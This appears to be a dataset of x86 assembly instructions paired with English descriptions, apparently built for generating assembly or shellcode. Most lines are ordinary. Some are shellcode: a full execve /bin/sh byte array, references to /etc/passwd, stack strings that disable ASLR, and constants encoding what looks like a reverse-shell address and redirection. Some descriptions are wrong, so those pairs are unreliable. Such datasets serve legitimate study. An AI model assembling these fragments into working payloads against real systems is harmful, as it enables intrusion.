loopnz Label1	decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero
loopnz next	decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero
loopnz next \n jmp ecx	decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register
loopnz next2 \n jmp edi	decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register
main_inc:	create label main_inc
main_inc:	declare the main_inc label
main_loop:	define main_loop label
main_push:	create label main_push
main_push:	declare the main_push label
main:	create main label
main:	declare the main label
main:	define main label
marks dw 0, 0, 0, 0	allocate memory for the marks array of words and initialize all elements to zero
matrix qw 12*10	allocate memory for a 12*10 quad-bytes matrix
me:	declare the me label
me:	define me label
message db '/bin/sh'	define message byte and initialize it to '/bin/sh'
message db 'hello',13,0	allocate memory for a null terminated string 'hello\n'
message db '/bin/sh'	define message as the byte string '/bin/sh'
message db '/etc/passwd'	define message as the byte string '/etc/passwd'
message db '/etc/passwd'	define the string message and initialize it to '/etc/passwd'
message: db 'hello world!'	declare message to contain the bytes 'hello world!'
message: db 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68	define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
mov [1000h], ax	move the value of ax into memory at address 1000h
mov [bp+0x07], al	move the contents of the al register at the memory location specified by the operation [bp+0x07]
mov [bp+0x0a], al	move the contents of the al register at the memory location specified by the operation [bp+0x0a]
mov [bp+0x31], al	move the contents of the al register at the memory location specified by the operation [bp+0x31]]
mov [bp+0x32], si	move the contents of the si register at the memory location specified by the operation [bp+0x32]
mov [bp+0x36], bx	move the contents of the bx register at the memory location specified by the operation [bp+0x36]
mov [bp+0x3a], bx	move the contents of the bx register at the memory location specified by the operation [bp+0x3a]
mov [bp+0x3e], ax	move the contents of the ax register at the memory location specified by the operation [bp+0x3e]
mov [ebp-4], edi	move edi into the local memory address ebp-4
mov [ebp+12], ecx	move ecx into the address [ebp+12]
mov [ebp+12], ecx	move the contents of ecx into the memory location specified by the operation [ebp+12]
mov [ebp+20], zero_reg	move the contents of zero_reg into the memory location specified by the operation [ebp+20]
mov [ebp+20], zero_reg	move zero_reg into the address [ebp+20]
mov [ebp+22], word ax	move the word at the address ax into [ebp+22]
mov [ebp+22], word ax	move the word in ax into the memory location specified by the operation [ebp+22]
mov [ebp+var_a], eax	move the contents of eax into address defined by ebp+var_a
mov [ebx + 6], dl	move dl into the address [ebx + 6]
mov [ebx], 110	move 110 into the effective address saved in ebx
mov [ebx], 123	move 123 into the effective address saved in ebx
mov [ebx+0xe], dl	move dl into the address [ebx+0xe]
mov [ebx+12], eax	move eax into ebx+12
mov [ebx+7], al	move al into ebx+7
mov [ebx+8], ebx	move ebx into ebx+8
mov [ecx], 25	move 25 decimal into the memory address ecx
mov [ecx+4], eax	move eax into the address [ecx+4]
mov [edi], al	move al into edi
mov [edi], al	move the contents of the al register into the edi register
mov [esi], al	move the contents of the al register into the esi register
mov [esi+13], al	move al into the address [esi+13]
mov [esi+22], al	move al into the address [esi+22]
mov [esi+34], al	move al into the address [esi+34]
mov [esi+35], esi	move esi into the address [esi+35]
mov [esi+39], ebx	move ebx into the address [esi+39]
mov [esi+43], ebx	move ebx into the address [esi+43]
mov [esi+47], eax	move eax into the address [esi+47]
mov [esi+eax], cl	move the contents of cl into the byte at memory address esi+eax
mov [esp + 1], cl	move cl into the address [esp + 1]
mov [esp+4], esp	move esp into the address [esp+4]
mov [esp+57], al	move al into the address [esp+57]
mov [esp+58], ah	move ah into the address [esp+58]
mov [esp+59], ebx	move ebx into the address [esp+59]
mov [var], ebx	move the contents of ebx into the 4 bytes at memory address var
mov [var1], eax	move the contents of eax into the 4 bytes at memory address var1
mov a_letter, al	move al into memory address a_letter
mov ah, 0x80	move 0x80 into ah
mov al, [byte_tbl+2]	move the effective address of byte_tbl+2 to al register
mov al, [esi]	move the contents of the esi register into the al register
mov al, 03h	move 03h into al
mov al, 04h	move 04h into al
mov al, 05h	move 05h into al
mov al, 0x01	move 0x01 into al
mov al, 0x01	move 0x1 into lower byte of the eax register
mov al, 0x04	move 0x04 into al
mov al, 0x05	put the syscall 0x5 into the al register
mov al, 0x06	move 0x06 into al
mov al, 0x0a	move 0x0a into al
mov al, 0x0b	move 0x0b into al
mov al, 0x1	move 0x1 into lower byte of the eax register
mov al, 0x1	move the value 0x1 into the al register
mov al, 0x17	move 0x17 into al
mov al, 0x1f	move 0x1f into al
mov al, 0x2	put the syscall 0x2 into the al register
mov al, 0x21	move 0x21 into al
mov al, 0x2e	move 0x2e into al
mov al, 0x3	move 0x3 into al
mov al, 0x30	move 0x30 into al
mov al, 0x33	move 0x33 into al
mov al, 0x3f	move 0x3f into al
mov al, 0x3f	syscall 63
mov al, 0x4	move 0x4 into al
mov al, 0x4	move the value 0x4 into the al register
mov al, 0x42	move 0x42 into al
mov al, 0x46	move 0x46 into al
mov al, 0x5	move 0x5 into al
mov al, 0x5	move the value 0x5 into the al register
mov al, 0x58	load the syscall value 0x58 for reboot in the al register
mov al, 0x6	move 0x6 into al
mov al, 0x66	make the socketcall
mov al, 0x66	make the systemcall socketcall
mov al, 0x66	move 0x66 into al
mov al, 0x66	syscall 102
mov al, 0x66	system call socketcall
mov al, 0x7	move 0x7 into al
mov al, 0x8	put the syscall 0x8 into the al register
mov al, 0xa2	move 0xa2 into al
mov al, 0xb	execve system call number 11
mov al, 0xb	mov 0xb into lower byte of eax
mov al, 0xb	move 0xb into al
mov al, 0xb5	move 0xb5 into al
mov al, 0xcd	move 0xcd into al
mov al, 0xf	move 0xf into al
mov al, 1	move 1 into al
mov al, 1	move the value 1 into the al register
mov al, 10	transfer the value 10 to the al register
mov al, 102	move 102 into al
mov al, 11	move the value 11 into the al register
mov al, 11	put the syscall 11 into the al register
mov al, 12	move 12 into al
mov al, 15	move 15 into lower byte of the eax register
mov al, 16	move 16 into al
mov al, 2	move 2 into al
mov al, 20	move 20 into al
mov al, 23	move 23 into al
mov al, 37	move 37 into al
mov al, 39	move 39 into al
mov al, 4	move 4 into al
mov al, 4	store 4 into al
mov al, 5	move 5 into al
mov al, 5 \n dec al \n jnz l2	move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero
mov al, 54	move 54 into al
mov al, 6	move 6 into al
mov al, 61	move 61 into al
mov al, 63	save 63 into al
mov al, 66h	move 66h into al
mov al, 70	move 70 into al
mov al, 72h	move 72h into al
mov al, 99	move 99 into al
mov al, a_letter	move data at memory location a_letter into al
mov al, byte [digits+eax]	move the effective address of digits+eax into al
mov al, byte [edi]	move the byte in edi into the al register
mov al, byte [edx+ecx]	move the effective address edx+ecx into al
mov al, byte [esi]	move the byte at the address [esi] into al
mov al, byte [esi]	move the byte in esi into al
mov al, byte [esi+1+ebp]	move the byte at the memory location specified by the operation [esi+1+ebp] into al
mov al, byte [esi+ecx]	move a byte from the address esi+ecx into al
mov al, byte 0bh	move the byte 0bh into al
mov al, byte 0bh	move the byte at the address 0bh into al
mov al, byte 0x1	move the byte at the address 0x1 into al
mov al, byte 2ah	move the byte 2ah into al
mov al, byte 2ah	move the byte at the address 2ah into al
mov al, byte 2h	move the byte 2h into al
mov al, byte 2h	move the byte at the address 2h into al
mov al, byte 3fh	move the byte 3fh into al
mov al, byte 3fh	move the byte at the address 3fh into al
mov al, byte 3h	move the byte 3h into al
mov al, byte 3h	move the byte at the address 3h into al
mov al, byte 66h	move the byte 66h into al
mov al, byte 66h	move the byte at the address 66h into al
mov al, byte 6h	move the byte 6h into al
mov al, byte 6h	move the byte at the address 6h into al
mov al, byte[buff+ecx]	move a byte from the address buff+ecx into al
mov al, cl	move cl into al
mov al, close_syscall	move close_syscall into al
mov al, dl	move dl into al
mov al, exit_call	move exit_call into al
mov al, write_syscall	move write_syscall into al
mov ax, [1000h]	load the object at the address 1000h into the ax register
mov ax, [di]	copy thevalue at memory address specified by di into ax
mov ax, [esi]	move esi into ex
mov ax, [esi]	move the contents of the esi register into the ax register
mov ax, [my_var]	copy my_var contents in ax
mov ax, 00	initialize ax to 00
mov ax, 010ch	move value of 0x010ch into the register ax
mov ax, 0x167	move 0x167 into ax
mov ax, 0x169	move 0x169 into ax
mov ax, 0x16a	move 0x16a into ax
mov ax, 0x16b	move 0x16b into ax
mov ax, 0x16c	move 0x16c into ax
mov ax, 1	move value of 1 into register ax
mov ax, 102	move 102 into ax
mov ax, 1666	move 1666 into ax
mov ax, 45h	transfer the immediate constant 45h to ax
mov ax, 8h	move 8h into ax
mov ax, 9	get 9 in the ax
mov ax, bx	move bx into ax
mov ax, bx	move the contents of bx into ax
mov ax, table[esi*4]	move the memory offset table+esi*4 into ax
mov bh, 0x12	move 0x12 into bh
mov bh, 0xe2	move 0xe2 into bh
mov bl, [esi+ecx]	move the contents of memory address esi+ecx into bl
mov bl, 0bh	move 0bh into bl
mov bl, 0x01	move 0x01 into bl
mov bl, 0x02	move 0x02 into bl
mov bl, 0x04	move 0x04 into bl
mov bl, 0x1	move 0x1 into bl
mov bl, 0x1	move the value 0x1 into the bl register
mov bl, 0x14	move 0x14 into bl
mov bl, 0x2	move 0x2 into bl
mov bl, 0x2	move the value 0x2 into the bl register
mov bl, 0x3	move 0x3 into bl
mov bl, 0x4	move 0x4 into bl
mov bl, 0x4	move the value 0x4 onto the stack
mov bl, 0x5	move 0x5 into bl
mov bl, 0x5	move the value 0x5 into the bl register
mov bl, 0x7	move 0x7 into bl
mov bl, 0x8	move 0x8 into bl
mov bl, 0x9	move 0x9 into bl
mov bl, 0xe	move 0xe into bl
mov bl, 0xff	move 0xff into bl
mov bl, 1	move 1 into bl
mov bl, 10	move 10 into bl
mov bl, 2	move 2 into bl
mov bl, 3	move 3 into bl
mov bl, 3 \n dec bl \n jnz l3	move the value 3 into the bl register then decrement the contents of the bl register and jump to the l3 label if the result is not zero
mov bl, 4	move 4 into bl
mov bl, 5	store 5 into bl
mov bl, al \n sub bl, 2 \n jnz loop	move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero
mov bl, byte [digits+ebx]	move the byte at address digits+ebx into bl
mov bl, byte [eax]	move the byte at the address [eax] into bl
mov bl, byte [eax]	move the byte in eax into bl
mov bl, byte [edi]	move the byte at the address [edi] into bl
mov bl, byte [edi]	move the byte in edi into bl
mov bl, byte [esi + eax + 1]	move the byte starting at the address [esi + eax + 1] into the bl register
mov bl, byte [esi]	move the byte at the address [esi] into bl
mov bl, byte [esi]	move the byte in esi into bl
mov bl, byte [esi+ecx+1]	move the byte at the address [esi+ecx+1] into bl
mov bl, byte [esi+ecx+1]	move the byte in esi+ecx+1 into bl
mov bl, byte 0eh	move the byte 0eh into bl
mov bl, byte 0eh	move the byte at the address 0eh into bl
mov bl, cl	move cl into bl
mov bl, dl	move dl into bl
mov bx, [esi]	move the contents of the esi register into the bx register
mov bx, 1666	move 1666 into bx
mov bx, 18	get 18 in the bx register
mov bx, 20	move the value 20 into bx
mov bx, word_value	move memory word_value to register bx
mov byte [eax], dl	move dl into the byte at address [eax]
mov byte [eax], dl	move dl into the byte in eax
mov byte [ebx + 35], al	move al into the byte at address [ebx + 35]
mov byte [ebx], 2	move 2 into the single byte at the address stored in ebx
mov byte [ecx], 2	move 2 into the single byte at memory location ecx
mov byte [ecx+92], dl	move dl into the byte at address [ecx+92]
mov byte [ecx+92], dl	move dl into the single byte at the address stored in ecx+92
mov byte [edi], bl	move bl into the byte in edi
mov byte [edi], bl	move the the contents of the bl register into the byte starting at the address in edi
mov byte [edx + eax], bl	move bl into the byte at address [edx + eax]
mov byte [edx+eax], bl	move bl into byte edx+eax
mov byte [edx+ecx],al	move al into the single byte at the address stored in edx+ecx
mov byte [esi + 1], dl	move dl into the byte at address [esi + 1]
mov byte [esi + 1], dl	move the contents of dl into the byte at the memory location specified by the operation [esi+1]
mov byte [esi], al	move al into the byte in esi
mov byte [esi], bl	move bl into the byte at address [esi]
mov byte [esi], dl	move dl into the byte in esi
mov byte [esi+10], al	move al into the byte at address [esi+10]
mov byte [esi+11], al	move al into the byte at address [esi+11]
mov byte [esi+12], al	move al into the byte at address [esi+12]
mov byte [esi+14], al	move al into the byte at address [esi+14]
mov byte [esi+14],al	move the contents of al into the byte at the memory location specified by the operation [esi+14]
mov byte [esi+17], al	move al into the byte at address [esi+17]
mov byte [esi+17],al	move the contents of al into the byte at the memory location specified by the operation [esi+17]
mov byte [esi+21], al	move al into the byte at address [esi+21]
mov byte [esi+7], al	move al into the byte at address [esi+7]
mov byte [esi+ecx], bl	move bl into the byte at address [esi+ecx]
mov byte [esi+ecx], bl	move bl into the single byte at the address stored in esi+ecx
mov byte [esp], 0x0a	move 0x0a into the byte at address [esp]
mov byte [esp], 0x2e	move 0x2e into the byte at address [esp]
mov byte [esp], 0x2e	move 0x2e into the byte in esp
mov byte [esp], 0x2f	move 0x2f into the byte at address [esp]
mov byte [esp], 0x2f	move 0x2f into the byte in esp
mov byte [esp], 0x7f	move 0x7f into the byte at address [esp]
mov byte [esp+2], 0x07	move 0x07 into the byte at address [esp+2]
mov byte [esp+3], 0x01	move 0x01 into the byte at address [esp+3]
mov byte [esp+3], 0x11	move 0x11 into the byte at address [esp+3]
mov byte [hexstr+edx+1],bl	move a byte from bl into memory address hexstr+edx+1
mov byte [hexstr+edx+2],al	move a byte from al into memory address hexstr+edx+2
mov byte [var], 5	store the value 5 into the byte at memory location var
mov byte al, 0x0b	move 0x0b into the byte at address al
mov byte al, 0x3f	move 0x3f into the byte at address al
mov byte al, 0x3f	move 0x3f into the byte in al
mov byte al, 0xa4	move 0xa4 into the byte at address al
mov byte al, 0xa4	move 0xa4 into the byte in al
mov byte al, 11	move 11 into the byte at address al
mov byte al, 83	move 83 into the byte at address al
mov byte cl, 7	move 7 into the byte at address cl
mov ch, 0x4	move 0x4 into ch
mov cl, 0102	move 0102 into cl
mov cl, 077o	move 077o into cl
mov cl, 0x1	move 0x1 into cl
mov cl, 0x1e	move 0x1e into cl
mov cl, 0x2	move 0x2 into cl
mov cl, 0x2	move the value 0x2 into the cl register
mov cl, 0x3	move 0x3 into cl
mov cl, 10 \n dec cl \n jnz l1	move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero
mov cl, 100	move 100 into cl
mov cl, 128	move 128 into cl
mov cl, 13	move 13 into cl
mov cl, 2	move 2 into cl
mov cl, 21	move 21 into cl
mov cl, 3	move 3 into cl
mov cl, 30	move 30 into cl
mov cl, 30	move 30 to the cl register
mov cl, 32	move 32 into cl
mov cl, 9	move 9 into cl
mov cl, al	move al into cl
mov cl, bl \n sub cl, 1 \n jnz loop	move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero
mov cl, byte [eax]	move the byte at the address [eax] into cl
mov cl, byte [eax]	move the byte in eax into cl
mov cl, byte [esi]	move the byte at the address [esi] into cl
mov cl, byte [esi]	move the byte in esi into cl
mov cl, byte_table[2]	move the 3rd element of the array byte_table into cl
mov cl, byte_table+2	move the 3rd element of the byte_table into cl
mov cl, len	move len into cl
mov cl, shellcode_length	move shellcode_length into cl
mov cl, shellcodelen	move shellcodelen into cl
mov count, bx	move bx to count
mov cx, [esi]	move the contents of the esi register into the cx register
mov cx, 01	initialize cx to 01
mov cx, 02001	move 02001 into cx
mov cx, 0666	move 0666 into cx
mov cx, 0700	move 0700 into cx
mov cx, 0x191	move 0x191 into cx
mov cx, 0x1ff	move 0x1ff into cx
mov cx, 0x2bc	move 0x2bc into cx
mov cx, 0x301	move the value 0x301 into the cx register
mov cx, 0x3b30	mov the value 0x3b30 into the cx register
mov cx, 0x401	move 0x401 into cx
mov cx, 0x5309	move 0x5309 into cx
mov cx, 0x9ed	move 0x9ed into cx
mov cx, 0xfff	move 0xfff into cx
mov cx, 2001	move 2001 into cx
mov cx, 2001Q	move 2001Q into cx
mov cx, word_table + 3	move the 4th element of the word_table into cx
mov cx, word_table[3]	move the 4th element of the array word_table into cx
mov dh, 0x35	move 0x35 into dh
mov dh, 0xff	move 0xff into dh
mov dl, 0x01	move 0x01 into dl
mov dl, 0x02	move 0x02 into dl
mov dl, 0x09	move 0x09 into dl
mov dl, 0x1	move 0x1 into dl
mov dl, 0x10	move 0x10 into dl
mov dl, 0x1c	move 0x1c into dl
mov dl, 0x2	move 0x2 into dl
mov dl, 0x20	move 0x20 into dl
mov dl, 0x7f	move 0x7f into dl
mov dl, 0xc	move 0xc into dl
mov dl, 0xd	move 0xd into dl
mov dl, 0xff	move 0xff into dl
mov dl, 1+0feh	move 1+0feh into dl
mov dl, 93	move 93 into dl
mov dl, byte [eax + 1]	move the byte at the address [eax + 1] into dl
mov dl, byte [eax + 1]	move the byte at the memory location specified by the operation [eax+1] into dl
mov dl, byte [eax]	move the byte at the address [eax] into dl
mov dl, byte [eax]	move the byte in eax into dl
mov dl, byte [esi + 1]	move the byte at the address [esi + 1] into dl
mov dl, byte [esi + 1]	move the singl byte at the memory location speicified by the operation [esi+1] into dl
mov dl, byte [esi]	move the single byte in esi into dl
mov dl, byte 0ffh	move the byte 0ffh into dl
mov dl, byte 0ffh	move the byte at the address 0ffh into dl
mov dl, len	move the contents stored at the address len into the dl register
mov dl,0x14	move 0x14 into dl
mov dword [eax], var1	copy the value in var1 into the doubleword starting at the address in eax
mov dword [ebx], 2	move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx
mov dword [ebx], 4	move the 32-bit integer representation of 4 into the doubleword starting at address ebx
mov dword [esi + 12], eax	move eax into the dword at address [esi + 12]
mov dword [esi + 8], ebx	move ebx into the dword at address [esi + 8]
mov dword [esp-0x10], 0x5f657a69	move the value 0x5f657a69 into the double word starting at the address [esp-0x10]
mov dword [esp-0x14], 0x6d6f646e	move the value 0x6d6f646e into the double word starting at the address [esp-0x14]
mov dword [esp-0x18], 0x61722f6c	move the value 0x61722f6c into the double word starting at the address [esp-0x18]
mov dword [esp-0x1c], 0x656e7265	move the value 0x656e7265 into the double word starting at the address [esp-0x1c]
mov dword [esp-0x20], 0x6b2f7379	move the value 0x6b2f7379 into the double word starting at the address [esp-0x20]
mov dword [esp-0x24], 0x732f636f	move the value 0x732f636f into the double word starting at the address [esp-0x24]
mov dword [esp-0x28], 0x72702f2f	move the value 0x72702f2f into the double word starting at the address [esp-0x28]
mov dword [esp-0x4], eax	move the contents of the eax into the double word starting at the address [esp-0x4]
mov dword [esp-0x8], 0x65636170	move the value 0x65636170 into the double word starting at the address [esp-0x8]
mov dword [esp-0xc], 0x735f6176	move the value 0x735f6176 into the double word starting at the address [esp-0xc]
mov dword [esp-12], 0x6374652f	move 0x6374652f into the dword at address [esp-12]
mov dword [esp-12], 0x6374652f	move 0x6374652f into the dword at the memory location [esp-12]
mov dword [esp-4], ecx	move ecx into the doubleword starting at the address esp-4
mov dword [esp-4], esi	move esi into the doubleword starting at the address esp-4
mov dword [esp-4], esi	move esi into the dword at address [esp-4]
mov dword [esp-4], esi	move the contents of the esi register into the dword at the memory location [esp-4]
mov dword [esp-8], 0x68732f2f	move 0x68732f2f into the dword at address [esp-8]
mov dword [esp-8], 0x68732f2f	move 0x68732f2f into the dword at the memory location [esp-8]
mov dword [esp-8], edi	move edi into the doubleword starting at the address esp-8
mov dx, 0x1a4	move 0x1a4 into dx
mov dx, 0x2a1	move the value 0x2a1 into the dx register
mov dx, 0xb01	move 0xb01 into dx
mov dx, 1222	move 1222 into dx
mov dx, 132	move 132 into dx
mov dx, 16666	move 16666 into dx
mov eax, _start	move _start into eax
mov eax, [ebp+8]	move value of memory address [ebp+8] into eax
mov eax, [ebx]	move the 4 bytes in memory at the address contained in ebx into eax
mov eax, [ebx+8]	copy the 4 byte at memory location specified by the the result of the operation ebx+8 into eax register
mov eax, [ebx+epi*4+2]	move the contents of memory address ebx+epi*4+2 into eax
mov eax, [ebx+esi]	move the contents of memory address ebx+esi into eax
mov eax, [ebx+esi*2+4]	move the contents of memory address ebx+esi*2+4 into eax
mov eax, [esi-4]	move 4 bytes at memory address esi-4 into eax
mov eax, [esp]	move the contents of memory address esp into eax
mov eax, [esp+4]	move the value of register at address esp+4 and store into eax
mov eax, [temp]	move the contents at memory specified by temp into eax
mov eax, [temp1]	move the contents at memory address temp1 to eax
mov eax, [x]	move the contents at memory specified by x to eax
mov eax, [y]	move the contents at memory address y to eax
mov eax, [y]	move the contents at memory specified by y to eax
mov eax, [z]	move the contents at memory specified by z to eax
mov eax, 0ah	move 0ah into eax
mov eax, 0ah	move an ascii linefeed character into eax
mov eax, 0ah	move linefeed character into eax
mov eax, 0x2e323931	move 0x2e323931 into eax
mov eax, 0x2e383631	move 0x2e383631 into eax
mov eax, 0x2f3e20	move 0x2f3e20 into eax
mov eax, 0x2f766564	move 0x2f766564 into eax
mov eax, 0x31263e32	move 0x31263e32 into eax
mov eax, 0x33392e31	move 0x33392e31 into eax
mov eax, 0x3f	move 0x3f into eax
mov eax, 0x5	move 5 into eax
mov eax, 0x50905090	move 0x50905090 into eax
mov eax, 0x563ed8b7	move 0x563ed8b7 into eax
mov eax, 0x66	move 0x66 into eax
mov eax, 0x6c6c756e	move 0x6c6c756e into eax
mov eax, 0x782f2f	move 0x782f2f into eax
mov eax, 0x8000	move the 32-bit value 0x8000 into register eax
mov eax, 0x8b90909d	move 0x8b90909d into eax
mov eax, 0x969d8cd0	move 0x969d8cd0 into eax
mov eax, 0x9a8dd091	move 0x9a8dd091 into eax
mov eax, 0xb33fb33f	move 0xb33fb33f into eax
mov eax, 0xdeadc0de	move 0xdeadc0de into eax
mov eax, 0xfeffff80	move 0xfeffff80 into eax
mov eax, 0xffffffff	move 0xffffffff into eax
mov eax, 1	code for exit syscall
mov eax, 1	exit
mov eax, 1	invoke sys_exit
mov eax, 1	make the system call exit
mov eax, 1	make the system call for exit
mov eax, 1	make the system call to terminate the process
mov eax, 1	move 1 into eax
mov eax, 1	move the value one into eax
mov eax, 1	specify exit syscall
mov eax, 1	system call exit
mov eax, 1	terminate the process
mov eax, 10	invoke sys_unlink
mov eax, 10	move 10 into eax
mov eax, 10000h	move 10000h into eax register
mov eax, 102	invoke sys_socketcall
mov eax, 106	get information about the file
mov eax, 106	make the system call stat
mov eax, 106	make the system call to get information about the file
mov eax, 106	stat
mov eax, 106	system call stat
mov eax, 11	execve
mov eax, 11	invoke sys_execve
mov eax, 11	load and run the program
mov eax, 11	make the system call execve
mov eax, 11	make the system to load and run the program
mov eax, 11	system call execve
mov eax, 13	invoke sys_time
mov eax, 132	move 132 to eax 132
mov eax, 19	go to file offset
mov eax, 19	invoke sys_lseek
mov eax, 19	lseek
mov eax, 19	make the system call lseek
mov eax, 19	make the system call to go to the file offset
mov eax, 19	system call lseek
mov eax, 2	create a new process
mov eax, 2	fork
mov eax, 2	invoke sys_fork
mov eax, 2	make the system call fork
mov eax, 2	make the system call to create a new process
mov eax, 2	move the value two into eax
mov eax, 2	system call fork
mov eax, 20	get the process ID
mov eax, 20	getpid
mov eax, 20	make the system call getpid
mov eax, 20	make the system call to get the process ID
mov eax, 20	system call getpid
mov eax, 21	get 21 in the eax register
mov eax, 27	alarm
mov eax, 27	make the system call alarm
mov eax, 27	make the system call to set set signal delivery alarm clock
mov eax, 27	set signal delivery alarm clock
mov eax, 27	system call alarm
mov eax, 29	make the system call pause
mov eax, 29	make the system call to suspend the process
mov eax, 29	pause
mov eax, 29	suspend the process until the signal arrives
mov eax, 29	system call pause
mov eax, 3	invoke sys_read
mov eax, 3	make the system call read
mov eax, 3	make the system call to read the file
mov eax, 3	move 3 to the eax register
mov eax, 3	read
mov eax, 3	read the file
mov eax, 3	specify sys_read call
mov eax, 3	system call read
mov eax, 37	kill
mov eax, 37	make the system call kill
mov eax, 37	make the system call to send the signal to another process
mov eax, 37	send signal to another process
mov eax, 37	system call kill
mov eax, 4	invoke sys_write
mov eax, 4	make the system call for write
mov eax, 4	make the system call to write to the file
mov eax, 4	make the system call write
mov eax, 4	move 4 into eax
mov eax, 4	move 4 to the eax register
mov eax, 4	specify sys_write call
mov eax, 4	specify sys_write syscall
mov eax, 4	system call write
mov eax, 4	write
mov eax, 4	write to the file
mov eax, 48	install signal handel
mov eax, 48	make the system call signal
mov eax, 48	make the system call to install the signal handler
mov eax, 48	signal
mov eax, 48	system call signal
mov eax, 5	invoke sys_open
mov eax, 5	make the system call open
mov eax, 5	make the system call to open the file
mov eax, 5	open
mov eax, 5	open the file
mov eax, 5	system call open
mov eax, 6	close
mov eax, 6	close the file
mov eax, 6	invoke sys_close
mov eax, 6	make the system call close
mov eax, 6	make the system call to close the file
mov eax, 6	system call close
mov eax, 63	copy file descriptor
mov eax, 63	dup2
mov eax, 63	make the system call dup2
mov eax, 63	make the system call to copy the file descriptor
mov eax, 63	system call dup2
mov eax, 64	get the parent process ID
mov eax, 64	getppid
mov eax, 64	make the system call getppid
mov eax, 64	make the system call to get the parent process ID
mov eax, 64	system call getppid
mov eax, 65	get process group
mov eax, 65	getpgrp
mov eax, 65	make the system call getpgrp
mov eax, 65	make the system call to get the process group
mov eax, 65	system call getpgrp
mov eax, 67	install portable signal handler
mov eax, 67	make the system call sigaction
mov eax, 67	make the system call to install portable signal handler
mov eax, 67	sigaction
mov eax, 67	system call sigaction
mov eax, 7	make the system call to wait for child for terminate
mov eax, 7	make the system call waitpid
mov eax, 7	system call waitpid
mov eax, 7	wait for child to terminate
mov eax, 7	waitpid
mov eax, 8	invoke sys_creat
mov eax, 90	make the system call mmap
mov eax, 90	make the system call to map the memory page to a file
mov eax, 90	map the memory page to a file
mov eax, 90	mmap
mov eax, 90	move decimal number 90 into eax
mov eax, 90	system call mmap
mov eax, addr	move addr into eax
mov eax, array[esi*4]	move the contents of memory address array+esi*4 into eax
mov eax, b	move b to eax
mov eax, buff	move buff to eax
mov eax, buffer	move the memory address of buffer variable into eax
mov eax, buzz	move the address of buzz string into eax
mov eax, c	move c to eax
mov eax, childmsg	move childmsg into eax
mov eax, ebx	copy the contents of ebx into eax register
mov eax, ebx	copy what is in ebx into eax
mov eax, ebx	move ebx to eax
mov eax, ebx	move the address in ebx into eax
mov eax, ebx	transfer ebx to eax
mov eax, ecx	move the value in ecx into eax
mov eax, ecx	move the value of ecx into eax
mov eax, edi	move edi into eax
mov eax, edx	move edx into eax
mov eax, edx	move the remainder into eax
mov eax, esi	move esi into eax
mov eax, esp	move stack pointer to eax
mov eax, esp	move the address of the current stack pointer into eax
mov eax, filecontents	move the memory address of filecontents variable into eax
mov eax, fizz	move the address of fizz string into eax
mov eax, key	move key into eax
mov eax, m_src	move m_src to eax
mov eax, msg	move the address of msg string into eax
mov eax, msg1	move msg1 string into eax
mov eax, msg1	move the address of msg1 into eax
mov eax, msg2	move the address of msg2 into eax
mov eax, msg3	move the address of msg3 into eax
mov eax, mxcsr	move mxcsr to eax
mov eax, n_src	move n_src to eax
mov eax, parentmsg	move parentmsg into eax
mov eax, response	move address of response variable into eax
mov eax, type var4	move the number of bytes of var4 into eax
mov ebp, buff	place address of buffer into ebp
mov ebp, eax	move eax to ebp
mov ebp, ecx	move ecx into ebp
mov ebp, esp	move esp into ebp
mov ebp, esp	point ebp to the esp register
mov ebp, esp	point ebp to top of stack
mov ebp, esp	set the new base pointer
mov ebx, [ebp-4]	move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register
mov ebx, [ebp-4]	move the contents of the address [ebp-4] into the ebx register
mov ebx, [ebp-8]	move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register
mov ebx, [ebp-8]	move the contents of the address [ebp-8] into the ebx register
mov ebx, [ebx+esi]	move the contents of memory address ebx+esi into ebx
mov ebx, [esp]	move value at top of the stack to ebx
mov ebx, [my_table]	move effective address of my_table in ebx
mov ebx, [my_table]	save the effective address of my_table in ebx
mov ebx, [temp2]	move the contents at memory address temp2 to ebx
mov ebx, [x]	move the contents at memory address x to ebx
mov ebx, [y]	move the contents at memory address y to ebx
mov ebx, 0	exit with return code of 0
mov ebx, 0	return 0 status on exit
mov ebx, 0	return a code of zero
mov ebx, 0	specify file descriptor 0 as standard input
mov ebx, 0	use stdin
mov ebx, 0	write to the stdin file
mov ebx, 0x1	move 0x1 into ebx
mov ebx, 0x2	move 0x2 into ebx
mov ebx, 0x4	move 0x4 into ebx
mov ebx, 0x40000	move the 32-bit value 0x40000 into register ebx
mov ebx, 0x5	move 0x5 into ebx
mov ebx, 0xfee1dead	move the value 0xfee1dead into the ebx register
mov ebx, 1	file descriptor 1 standard output
mov ebx, 1	invoke subroutine socket
mov ebx, 1	move 1 into ebx
mov ebx, 1	specify file descriptor 1 standard output
mov ebx, 1	use stdout
mov ebx, 1	write to the stdout file
mov ebx, 10	move decimal value 10 into ebx
mov ebx, 2	invoke subroutine bind
mov ebx, 2	specify file descriptor 2 standard error
mov ebx, 3	invoke subroutine connect
mov ebx, 3	move 3 to the ebx register
mov ebx, 3	move decimal number 3 into ebx
